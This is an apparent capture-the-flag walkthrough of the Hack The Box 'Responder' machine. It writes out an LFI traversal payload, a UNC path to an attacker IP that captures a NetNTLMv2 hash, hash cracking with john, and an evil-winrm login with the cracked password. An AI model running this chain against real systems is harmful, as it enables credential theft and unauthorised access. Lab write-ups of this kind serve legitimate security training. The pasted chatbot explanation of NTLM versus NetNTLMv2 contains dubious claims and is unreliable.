@@ -1,0 +1,181 @@
+We will begin to scan our target ip:
+nmap -p1-30000 --min-rate 5000 -sV (target ip)
+
+How does Nmap determine the service running on the port?
+Nmap uses a port-services database of well-known services in order to determine the service
+running on a particular port. It later also sends some service-specific requests to that port to
+determine the service version & any additional information about it.
+Thus, Nmap is mostly but not always correct about the service info for a particular port.
+
+According to the results of the Nmap scan, the machine is using Windows as its operating system. Two ports
+were detected as open having Apache web server running on port 80 along with WinRM on port 5985
+
+Windows Remote Management, or WinRM, is a Windows-native built-in remote management protocol
+that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as
+Operating Systems and applications. WinRM allows the user to :
+→ Remotely communicate and interface with hosts
+→ Execute commands remotely on systems that are not local to you but are network accessible.
+→ Monitor, manage and configure servers, operating systems and client machines from a remote location.
+As a pentester, this means that if we can find credentials (typically username and password) for a user who
+has remote management privileges, we can potentially get a PowerShell shell on the host.
+
+On opening Firefox and putting http://[target ip] , the browser returns a message about being unable
+to find that site. Looking in the URL bar, it now shows http://unika.htb . The website has redirected the
+browser to a new URL, and your host doesn't know how to find unika.htb . This webserver is employing
+name-based Virtual Hosting for serving the requests.
+
+Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of
+each name) on a single server. This allows one server to share its resources, such as memory and processor
+cycles, without requiring all the services to be used by the same hostname.
+The web server checks the domain name provided in the Host header field of the HTTP request and sends
+a response according to that.
+The /etc/hosts file is used to resolve a hostname into an IP address & thus we will need to add an entry in
+the /etc/hosts file for this domain to enable the browser to resolve the address for unika.htb .
+
+echo "(target ip) unika.htb" | sudo tee -a /etc/hosts
+
+Adding this entry in the /etc/hosts file will enable the browser to resolve the hostname unika.htb to
+the corresponding IP address & thus make the browser include the HTTP header Host: unika.htb in
+every HTTP request that the browser sends to this IP address, which will make the server respond with the
+webpage for unika.htb .
+On accessing the web page we are presented with a web designing business landing page.
+
+Noticing the URL, we can see that the french.html page is being loaded by the page parameter, which
+may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized.
+
+File Inclusion Vulnerability
+Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET
+and POST parameters, cookies, and other variables. It is common for a page to "include" another page
+based on some of these parameters.
+ LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
+intended to be an option for this application. A common example is when an application uses the path to a
+file as input. If the application treats this input as trusted, and the required sanitary checks are not
+performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name
+and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
+execution as well.
+ RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote
+file on the host using protocols like HTTP, FTP etc.
+We test the page parameter to see if we can include files on the target system in the server response. We
+will test with some commonly known files that will have the same name across networks, Windows
+domains, and some other systems. One of the most common files that a penetration tester
+might attempt to access on a Windows machine to verify LFI is the hosts file,
+WINDOWS\System32\drivers\etc\hosts (this file aids in the local translation of host names to IP
+addresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are
+included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\
+
+So we try to put this text next to the url address of the target website: "/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts"
+
+This allowed us to see the content of the C:\windows\system32\drivers\etc\hosts file, which means that LFI is possible.
+
+The file inclusion, in this case, was made possible because in the backend the include() method of PHP is
+being used to process the URL parameter page for serving a different webpage for different languages.
+And because no proper sanitization is being done on this page parameter, we were able to pass malicious
+input and therefore view the internal system files.
+
+
+Responder Challenge Capture:
+
+We know that this web page is vulnerable to the file inclusion vulnerability and is being served on a
+Windows machine. Thus, there exists a potential for including a file on our attacker workstation. If we select
+a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.
+What is NTLM (New Technology Lan Manager)?
+NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
+authentication protocol used to authenticate a client to a resource on an Active Directory domain.
+It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
+only once, at login.
+The NTLM authentication process is done in the following way :
+1. The client sends the user name and domain name to the server.
+2. The server generates a random character string, referred to as the challenge.
+3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
+server.
+4. The server retrieves the user password (or equivilent).
+5. The server uses the hash value retrieved from the security account database to encrypt the challenge
+string. The value is then compared to the value received from the client. If the values match, the client
+is authenticated.
+
+
+NTLM vs NTHash vs NetNTMLv2:
+
+The terminology around NTLM authentication is messy, and even pros misuse it from time to time, so let's
+get some key terms defined:
+A hash function is a one way function that takes any amount of data and returns a fixed size value.
+Typically, the result is referred to as a hash, digest, or fingerprint. They are used for storing passwords
+more securely, as there's no way to convert the hash directly back to the original data (though there
+are attacks to attempt to recover passwords from hashes, as we'll see later). So a server can store a
+hash of your password, and when you submit your password to the site, it hashes your input, and
+compares the result to the hash in the database, and if they match, it knows you supplied the correct
+password.
+An NTHash is the output of the algorithm used to store passwords on Windows systems in the SAM
+database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an
+NTLM, which is very misleading / confusing.
+When the NTLM protocol wants to do authentication over the network, it uses a challenge / response
+model as described above. A NetNTLMv2 challenge / response is a string specifically formatted to
+include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually
+a hash. Still, it is regularly referred to as a hash because we attack it in the same manner. You'll see
+NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM.
+
+
+Ok, but what is the difference between NTLM and NetNTMLv2:
+
+chatgpt asnwer:NTLM (NT LAN Manager) and NetNTLMv2 (Net NT LAN Manager version 2) are both authentication protocols used in Windows operating systems. They are used to authenticate users and provide secure access to network resources. However, there are significant differences between the two protocols.
+
+Security: NetNTLMv2 is considered more secure than NTLM. NTLM uses relatively weak security mechanisms, including a simple challenge-response mechanism and the use of an easily reversible hash for storing user passwords. This makes NTLM vulnerable to various attacks, such as brute-force attacks and pass-the-hash attacks. NetNTLMv2, on the other hand, incorporates stronger security features, including stronger hashing algorithms and the use of random challenge values, making it more resistant to attacks.
+
+Authentication process: NTLM and NetNTLMv2 have different authentication processes. In NTLM, the client sends a hashed version of the user's password to the server, which then compares it with the stored hash value. NetNTLMv2 enhances the authentication process by adding mutual authentication and the use of cryptographic algorithms. It also includes additional data, such as the client and server challenge values, which are used to generate the response and prevent replay attacks.
+
+Compatibility: NTLM is an older protocol that has been in use since Windows NT. It is still supported for backward compatibility reasons in modern Windows systems. NetNTLMv2 was introduced in Windows 2000 and has been the recommended protocol for authentication since then. However, some legacy systems or applications may still rely on NTLM, so support for both protocols is maintained in Windows.
+
+Active Directory integration: NetNTLMv2 is better integrated with Active Directory, the directory service used in Windows environments. Active Directory provides centralized management of user accounts, security policies, and other resources. NetNTLMv2 allows for stronger authentication and encryption options when used in conjunction with Active Directory, providing a more comprehensive security framework.
+
+Overall, NetNTLMv2 is an improvement over NTLM in terms of security and authentication features. It is recommended to use NetNTLMv2 wherever possible to ensure stronger security measures are in place.
+
+
+
+How does Responder work?:
+
+Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB
+server. When the target machine attempts to perform the NTLM authentication to that server, Responder
+sends a challenge back for the server to encrypt with the user's password. When the server responds,
+Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can't
+reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same
+challenge-response, and if we find one, we know that is the password. This is often referred to as hash
+cracking, which we'll do with a program called John The Ripper.
+
+First, we need to make sure that the Responder tool is set to listen for SMB requests by opening Responder.conf file and check for SMB=On.
+
+With the configuration file ready, we can proceed to start Responder with python3 , passing in the interface
+to listen on using the -I flag: sudo responder -I tun0.
+
+Now, Responder is listening to events. To capture any event, first we need to get our ip address on tun0, we do ifconfig tun0, we copy the ip address and then we concat this ip address to the url of the target website like so: http://unika.htb/index.php?page=//10.10.14.117/somefilewhatever.
+
+Now, Responder has the NetNTLMv2 hash. The NetNTLMv2 includes both the challenge (random text) and the encrypted response.
+
+
+Hash Cracking: 
+
+
+We can dump the hash into a file and attempt to crack it with john , which is a password hash cracking
+utility.
+
+We pass the hash file to john and crack the password for the Administrator account. The hash type is
+automatically identified by the john command-line tool. john -w=/usr/share/wordlists/rockyou.txt hash.txt
+
+-w : wordlist to use for cracking the hash.
+
+In our case, we needed to unzip the rockyou.txt.gz file using sudo gunzip rockyou.txt.gz 
+
+We needed to go back to where the hash file is stored and run this command john -w=/usr/share/wordlists/rockyou.txt hash.txt .
+
+We get the password is badminton for user Administrator.
+
+We'll connect to the WinRM service on the target and try to get a session. Because PowerShell isn't installed
+on Linux by default, we'll use a tool called Evil-WinRM which is made for this kind of scenario.
+
+evil-winrm -i (target ip) -u administrator -p badminton
+
+this will allow us to access a Windows machine remotly. We can find the flag in users/mike/desktop
+
+flag: ea81b7afddd03efaa0945333ed147fac
+
+//END
+
